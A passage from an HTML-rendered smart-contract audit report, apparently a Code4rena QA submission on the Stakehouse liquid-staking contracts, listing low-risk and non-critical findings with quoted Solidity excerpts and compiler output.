2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Summary</h2>\n<h3 id=\"low-risk-issues-list\" style=\"position:relative;\"><a href=\"#low-risk-issues-list\" aria-label=\"low risk issues list permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Low Risk Issues List</h3>\n<table>\n<thead>\n<tr>\n<th align=\"center\">Number</th>\n<th align=\"left\">Issues Details</th>\n<th align=\"center\">Context</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td align=\"center\">[L-01]</td>\n<td align=\"left\">Draft Openzeppelin Dependencies</td>\n<td align=\"center\">1</td>\n</tr>\n<tr>\n<td align=\"center\">[L-02]</td>\n<td align=\"left\">Stack too deep when compiling</td>\n<td align=\"center\"></td>\n</tr>\n<tr>\n<td align=\"center\">[L-03]</td>\n<td align=\"left\">Remove unused code</td>\n<td align=\"center\">2</td>\n</tr>\n<tr>\n<td align=\"center\">[L-04]</td>\n<td align=\"left\">Insufficient coverage</td>\n<td align=\"center\"></td>\n</tr>\n<tr>\n<td align=\"center\">[L-05]</td>\n<td align=\"left\">Critical Address Changes Should Use Two-step Procedure</td>\n<td align=\"center\"></td>\n</tr>\n<tr>\n<td align=\"center\">[L-06]</td>\n<td align=\"left\">Owner can renounce Ownership</td>\n<td align=\"center\">2</td>\n</tr>\n<tr>\n<td align=\"center\">[L-07]</td>\n<td align=\"left\">Loss of precision due to rounding</td>\n<td align=\"center\">1</td>\n</tr>\n<tr>\n<td align=\"center\">[L-08]</td>\n<td align=\"left\">Using vulnerable dependency of OpenZeppelin</td>\n<td align=\"center\">1</td>\n</tr>\n<tr>\n<td align=\"center\">[L-09]</td>\n<td align=\"left\">Use <code>safeTransferOwnership</code> instead of <code>transferOwnership</code> function</td>\n<td align=\"center\">2</td>\n</tr>\n</tbody>\n</table>\n<p>Total 9 issues</p>\n<h3 id=\"non-critical-issues-list\" style=\"position:relative;\"><a href=\"#non-critical-issues-list\" aria-label=\"non critical issues list permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Non-Critical Issues List</h3>\n<table>\n<thead>\n<tr>\n<th align=\"center\">Number</th>\n<th align=\"left\">Issues Details</th>\n<th align=\"center\">Context</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td align=\"center\">[N-01]</td>\n<td align=\"left\"><code>0 address</code> check</td>\n<td align=\"center\">7</td>\n</tr>\n<tr>\n<td align=\"center\">[N-02]</td>\n<td align=\"left\">Add parameter to Event-Emit</td>\n<td align=\"center\">1</td>\n</tr>\n<tr>\n<td align=\"center\">[N-03]</td>\n<td align=\"left\">Omissions in Events</td>\n<td align=\"center\">1</td>\n</tr>\n<tr>\n<td align=\"center\">[N-04]</td>\n<td align=\"left\">Include <code>return parameters</code> in <em>NatSpec comments</em></td>\n<td align=\"center\">All contracts</td>\n</tr>\n<tr>\n<td align=\"center\">[N-05]</td>\n<td align=\"left\">Use a more recent version of Solidity</td>\n<td align=\"center\">All contracts</td>\n</tr>\n<tr>\n<td align=\"center\">[N-06]</td>\n<td align=\"left\">Solidity compiler optimizations can be problematic</td>\n<td align=\"center\"></td>\n</tr>\n<tr>\n<td align=\"center\">[N-07]</td>\n<td align=\"left\">NatSpec is missing</td>\n<td align=\"center\">27</td>\n</tr>\n<tr>\n<td align=\"center\">[N-08]</td>\n<td align=\"left\">Lines are too long</td>\n<td align=\"center\">9</td>\n</tr>\n<tr>\n<td align=\"center\">[N-09]</td>\n<td align=\"left\">Missing Event for critical parameters change</td>\n<td align=\"center\">1</td>\n</tr>\n<tr>\n<td align=\"center\">[N-10]</td>\n<td align=\"left\">Add to indexed parameter for countable Events</td>\n<td align=\"center\">4</td>\n</tr>\n<tr>\n<td align=\"center\">[N-11]</td>\n<td align=\"left\">NatSpec comments should be increased in contracts</td>\n<td align=\"center\">All contracts</td>\n</tr>\n<tr>\n<td align=\"center\">[N-12]</td>\n<td align=\"left\">Open TODOs</td>\n<td align=\"center\">1</td>\n</tr>\n<tr>\n<td align=\"center\">[N-13]</td>\n<td align=\"left\"><code>Empty blocks</code> should be <em>removed</em> or <em>Emit</em> something</td>\n<td align=\"center\">10</td>\n</tr>\n<tr>\n<td align=\"center\">[N-14]</td>\n<td align=\"left\">Avoid variable names that can shade</td>\n<td align=\"center\">1</td>\n</tr>\n<tr>\n<td align=\"center\">[N-15]</td>\n<td align=\"left\">Use a more recent version of Solidity</td>\n<td align=\"center\">All contracts</td>\n</tr>\n<tr>\n<td align=\"center\">[N-16]</td>\n<td align=\"left\"><em>Lock pragmas</em> to specific compiler version</td>\n<td align=\"center\">24</td>\n</tr>\n</tbody>\n</table>\n<p>Total 16 issues</p>\n<h3 id=\"suggestions\" style=\"position:relative;\"><a href=\"#suggestions\" aria-label=\"suggestions permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Suggestions</h3>\n<table>\n<thead>\n<tr>\n<th align=\"center\">Number</th>\n<th align=\"left\">Suggestion Details</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td align=\"center\">[S-01]</td>\n<td align=\"left\">Generate perfect code headers every time</td>\n</tr>\n</tbody>\n</table>\n<p>Total 1 suggestion</p>\n<h2 id=\"l-01-draft-openzeppelin-dependencies\" style=\"position:relative;\"><a href=\"#l-01-draft-openzeppelin-dependencies\" aria-label=\"l 01 draft openzeppelin dependencies permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-01] Draft Openzeppelin Dependencies</h2>\n<p>The <code>LPToken.sol</code> contract utilised draft-ERC20PermitUpgradeable.sol , an OpenZeppelin contract. This contract is still a draft and is not considered ready for mainnet use. OpenZeppelin contracts may be considered draft contracts if they have not received adequate security auditing or are liable to change with future development.</p>\n<p><a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LPToken.sol#L6\">LPToken.sol#L6</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"152\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">liquid</span><span class=\"mtk1\">-</span><span class=\"mtk12\">staking</span><span class=\"mtk1\">/</span><span class=\"mtk12\">LPToken</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">6</span><span class=\"mtk1\">: </span><span class=\"mtk15\">import</span><span class=\"mtk1\"> { </span><span class=\"mtk12\">ERC20PermitUpgradeable</span><span class=\"mtk1\"> } </span><span class=\"mtk15\">from</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;@openzeppelin/contracts-upgradeable/token/ERC20/extensions/draft-ERC20PermitUpgradeable.sol&quot;</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<h2 id=\"l-02-stack-too-deep-when-compiling\" style=\"position:relative;\"><a href=\"#l-02-stack-too-deep-when-compiling\" aria-label=\"l 02 stack too deep when compiling permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-02] Stack too deep when compiling</h2>\n<p>The project cannot be compiled due to the “stack too deep” error.</p>\n<p>The “stack too deep” error is a limitation of the current code generator. The EVM stack only has 16 slots and that’s sometimes not enough to fit all the local variables, parameters and/or return variables. The solution is to move some of them to memory, which is more expensive but at least makes your code compile.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"js\" data-index=\"153\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">[⠒] </span><span class=\"mtk12\">Compiling</span><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">[⠰] </span><span class=\"mtk12\">Compiling</span><span class=\"mtk1\"> </span><span class=\"mtk7\">100</span><span class=\"mtk1\"> </span><span class=\"mtk12\">files</span><span class=\"mtk1\"> </span><span class=\"mtk15\">with</span><span class=\"mtk1\"> </span><span class=\"mtk7\">0.8</span><span class=\"mtk1\">.</span><span class=\"mtk7\">13</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">[⠔] </span><span class=\"mtk12\">Solc</span><span class=\"mtk1\"> </span><span class=\"mtk7\">0.8</span><span class=\"mtk1\">.</span><span class=\"mtk7\">13</span><span class=\"mtk1\"> </span><span class=\"mtk12\">finished</span><span class=\"mtk1\"> </span><span class=\"mtk4\">in</span><span class=\"mtk1\"> 3.35</span><span class=\"mtk12\">s</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">Error: </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">Compiler</span><span class=\"mtk1\"> </span><span class=\"mtk12\">run</span><span class=\"mtk1\"> </span><span class=\"mtk12\">failed</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">CompilerError: </span><span class=\"mtk12\">Stack</span><span class=\"mtk1\"> </span><span class=\"mtk12\">too</span><span class=\"mtk1\"> </span><span class=\"mtk12\">deep</span><span class=\"mtk1\"> </span><span class=\"mtk12\">when</span><span class=\"mtk1\"> </span><span class=\"mtk12\">compiling</span><span class=\"mtk1\"> </span><span class=\"mtk12\">inline</span><span class=\"mtk1\"> assembly: </span><span class=\"mtk12\">Variable</span><span class=\"mtk1\"> </span><span class=\"mtk12\">headStart</span><span class=\"mtk1\"> </span><span class=\"mtk12\">is</span><span class=\"mtk1\"> </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk11\">slot</span><span class=\"mtk1\">(</span><span class=\"mtk12\">s</span><span class=\"mtk1\">) </span><span class=\"mtk12\">too</span><span class=\"mtk1\"> </span><span class=\"mtk12\">deep</span><span class=\"mtk1\"> </span><span class=\"mtk12\">inside</span><span class=\"mtk1\"> </span><span class=\"mtk12\">the</span><span class=\"mtk1\"> </span><span class=\"mtk12\">stack</span><span class=\"mtk1\">.</span></span></span></code></pre>\n<p>ref:<a href=\"https://forum.openzeppelin.com/t/stack-too-deep-when-compiling-inline-assembly/11391/6\">https://forum.openzeppelin.com/t/stack-too-deep-when-compiling-inline-assembly/11391/6</a></p>\n<h2 id=\"l-03-remove-unused-code\" style=\"position:relative;\"><a href=\"#l-03-remove-unused-code\" aria-label=\"l 03 remove unused code permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-03] Remove unused code</h2>\n<p>This code is not used in the project, remove it or add event-emit;</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"154\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">liquid</span><span class=\"mtk1\">-</span><span class=\"mtk12\">staking</span><span class=\"mtk1\">/</span><span class=\"mtk12\">GiantPoolBase</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">100</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_onDepositETH</span><span class=\"mtk1\">() </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">virtual</span><span class=\"mtk1\"> {}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">103</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_onWithdraw</span><span class=\"mtk1\">(</span><span class=\"mtk12\">LPToken</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_lpTokens</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">virtual</span><span class=\"mtk1\"> {}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">104</span><span class=\"mtk1\">  }</span></span></span></code></pre>\n<h2 id=\"l-04-insufficient-coverage\" style=\"position:relative;\"><a href=\"#l-04-insufficient-coverage\" aria-label=\"l 04 insufficient coverage permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-04] Insufficient coverage</h2>\n<p><strong>Description:</strong><br>\nTesting all functions is best practice in terms of security criteria.</p>\n<p>This function test coverage is not found in test files</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"155\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">rawExecute</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">target</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">callData</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">value</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">external</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">override</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">payable</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">onlyOwner</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        (</span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">result</span><span class=\"mtk1\">, </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">message</span><span class=\"mtk1\">) = </span><span class=\"mtk12\">target</span><span class=\"mtk1\">.</span><span class=\"mtk12\">call</span><span class=\"mtk1\">{value: </span><span class=\"mtk12\">value</span><span class=\"mtk1\">}(</span><span class=\"mtk12\">callData</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">result</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Failed to execute&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">message</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>Due to its capacity, test coverage is expected to be 100%</p>\n<h2 id=\"l-05-critical-address-changes-should-use-two-step-procedure\" style=\"position:relative;\"><a href=\"#l-05-critical-address-changes-should-use-two-step-procedure\" aria-label=\"l 05 critical address changes should use two step procedure permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-05] Critical Address Changes Should Use Two-step Procedure</h2>\n<p>The critical procedures should be two step process.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"156\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">smart</span><span class=\"mtk1\">-</span><span class=\"mtk12\">wallet</span><span class=\"mtk1\">/</span><span class=\"mtk12\">OwnableSmartWallet</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   </span><span class=\"mtk7\">94</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">transferOwnership</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">newOwner</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   95:         </span><span class=\"mtk11\">public</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   96:         </span><span class=\"mtk11\">override</span><span class=\"mtk1\">(</span><span class=\"mtk12\">IOwnableSmartWallet</span><span class=\"mtk1\">, </span><span class=\"mtk12\">Ownable</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   97:     {</span></span></span></code></pre>\n<p><strong>Recommended Mitigation Steps:</strong><br>\nLack of two-step procedure for critical operations leaves them error-prone. Consider adding two step procedure on the critical functions.</p>\n<h2 id=\"l-06-owner-can-renounce-ownership\" style=\"position:relative;\"><a href=\"#l-06-owner-can-renounce-ownership\" aria-label=\"l 06 owner can renounce ownership permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-06] Owner can renounce Ownership</h2>\n<p><strong>Context:</strong></p>\n<p><a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L6\">LiquidStakingManager.sol#L6</a><br>\n<a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/syndicate/Syndicate.sol#L8\">Syndicate.sol#L8</a></p>\n<p><strong>Description:</strong><br>\nTypically, the contract’s owner is the account that deploys the contract. As a result, the owner is able to perform certain privileged activities.</p>\n<p>The StakeHouse Ownable used in this project contract implements renounceOwnership. This can represent a certain risk if the ownership is renounced for any other reason than by design. Renouncing ownership will leave the contract without an owner, thereby removing any functionality that is only available to the owner.</p>\n<p><code>onlyOwner</code> functions;</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"157\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">8</span><span class=\"mtk1\"> </span><span class=\"mtk12\">results</span><span class=\"mtk1\"> - </span><span class=\"mtk7\">2</span><span class=\"mtk1\"> </span><span class=\"mtk12\">files</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">smart</span><span class=\"mtk1\">-</span><span class=\"mtk12\">wallet</span><span class=\"mtk1\">/</span><span class=\"mtk12\">OwnableSmartWallet</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   </span><span class=\"mtk7\">44</span><span class=\"mtk1\">          </span><span class=\"mtk12\">payable</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   </span><span class=\"mtk7\">45</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">onlyOwner</span><span class=\"mtk1\"> </span><span class=\"mtk3\">// F: [OSW-6A]</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   </span><span class=\"mtk7\">46</span><span class=\"mtk1\">          </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   </span><span class=\"mtk7\">59</span><span class=\"mtk1\">          </span><span class=\"mtk12\">payable</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   </span><span class=\"mtk7\">60</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">onlyOwner</span><span class=\"mtk1\"> </span><span class=\"mtk3\">// F: [OSW-6A]</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   </span><span class=\"mtk7\">61</span><span class=\"mtk1\">          </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   </span><span class=\"mtk7\">74</span><span class=\"mtk1\">      </span><span class=\"mtk12\">payable</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   </span><span class=\"mtk7\">75</span><span class=\"mtk1\">:     </span><span class=\"mtk12\">onlyOwner</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   </span><span class=\"mtk7\">76</span><span class=\"mtk1\">      </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">114</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setApproval</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">to</span><span class=\"mtk1\">, </span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> 